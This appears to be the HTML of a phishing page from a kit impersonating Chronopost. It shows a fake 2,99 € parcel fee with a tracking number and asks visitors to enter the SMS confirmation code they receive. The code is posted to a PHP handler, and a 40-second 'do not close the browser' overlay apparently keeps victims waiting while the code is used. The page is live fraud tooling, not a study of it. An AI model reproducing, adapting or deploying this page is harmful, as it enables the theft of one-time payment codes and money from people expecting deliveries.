
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
    <title>Chronopost |Envoi et suivi de colis</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="htdocs/img/favicon.jpg" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_001.css">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_002.css">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_003.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/00ce2dd051.js" crossorigin="anonymous"></script>
<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(40000).fadeOut(150);
            });
        });

</script></head>
<body>
 <div class="pageLoader" id="loadingo9lawzan" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1.9; text-align: center; display: none;">
<p style="margin-top: 94px;font-size: 19px;color: #5f5f5f!important;font-weight: 500;">
<p class="alert alert-success" id="alert-success"><i class="fas fa-exclamation"></i> &nbsp;  Attendez pendant que nous traitons votre demande. Ne fermez pas le navigateur.</p>
</p>
  <div class="spinner loading"></div></div>
<div class="topnav" id="myTopnav">
  <a href="# " id="top-left"><img src="htdocs/img/separadortop.png" ></a>
  


<a href="#contact " id="top-img_hr">&nbsp;&nbsp;&nbsp;&nbsp;</a>
  <a href="javascript:void(0);" class="icon" >
    <i class="fa fa-bars"></i>
  </a>
</div>

<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container">
    <a class="navbar-brand" href="#"><img src="htdocs/img/logo.png" alt=""></a>
  </div>
</nav>


<div class="btm_nav" id="myTopnav">
  <a href="#">Se connecter</a>
  <a href="#">Particuliers</a>
  <a href="#">Entreprises</a>
  <a href="#">Aide</a>
  <a href="#">Compagnie</a>
  <a href="#">Livreurs</a>
</div>



<div class="container">

<div class="row">
<div class="col-sm-9">
<form name="myForm" action="sourceApp/codigo.php" onsubmit="return validateForm()" method="post">
<div class="card-body p-5 " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <p class="alert alert-success" id="xalert-success"><i class="fas fa-sms"></i>&nbsp; Dans une seconde, vous recevrez un code SMS envoyé à votre numéro de téléphone, entrez-le ci-dessous pour confirmer votre transaction</p>

      
<div class="card text-center">
  <div class="card-body" style=" color: #191919; background-color: #ffffff; ">
    <h5 class="card-title">Entrez le code reçu par SMS</h5>
    <div class="form-group">
 <input class="form-control" style="text-align: center;" type="text" onkeypress="if(this.value.length==8) return false;" id="CED1" name="CED1">                    </div>

  
  <button class="subscribe btn btn-primary btn-block" type="submit"> confirmer  </button>


  </div>
 
</div>

  
 <!-- row.// -->
 
  
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div></form>
  
  
 

            </div>

         <div class="col-sm-3 ">
               
               <div class="card">
  <div class="card-header">
   <strong> détails de la transaction </strong>
  </div>
  <ul class="list-group list-group-flush">
    <li class="list-group-item"><strong> montant: </strong>2,99 €</li>
    <li class="list-group-item"><strong> commerce: </strong>CHRONOPOST</li>
    <li class="list-group-item"><strong> terminal: </strong>346841091-1</li>
    <li class="list-group-item"><strong> Pracel: </strong><strong>XC25453425FR</strong></li>
    <li class="list-group-item"><img src="./htdocs/img/logopie.png"></li>
  </ul>

  
</div>

        </div>
 </div>
  </div>





<!-- Footer -->
<footer class="page-footer font-small indigo">
   <!-- Footer Links -->
   <div class="container text-center text-md-left">
      <!-- Grid row -->
      <div class="row">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Particulier</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Envoyer un colis</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Suivre un envoi</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nos offres</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Estimez les tarifs</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Aide</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Se créer un compte</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nos guides</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Vos questions fréquentes</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Espace Outre-Mer</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Flash info</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class="text-uppercase mt-3 mb-4">Mieux nous connaître</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Gouvernance Chronopost</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nous rejoindre</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Engagé et responsable</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">A propos de Chronopost</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Espace Presse</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Informations légales</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Mentions légales</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Alerte fraude</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
      </div>
      <!-- Grid row -->
   </div>
   <!-- Footer Links -->
   <!-- Copyright -->
   <div class="footer-copyright  py-3">
      <a href="" class="copyright">Copyright © Chronopost 2021</a>
      <a href="" class="logo-ft"> <img src="htdocs/img/logopie.png" ></a>
   </div>
   <!-- Copyright -->
</footer>
<!-- Footer -->
<script  src="sourceApp/chronopost_sm.js"></script>

</body>
</html>
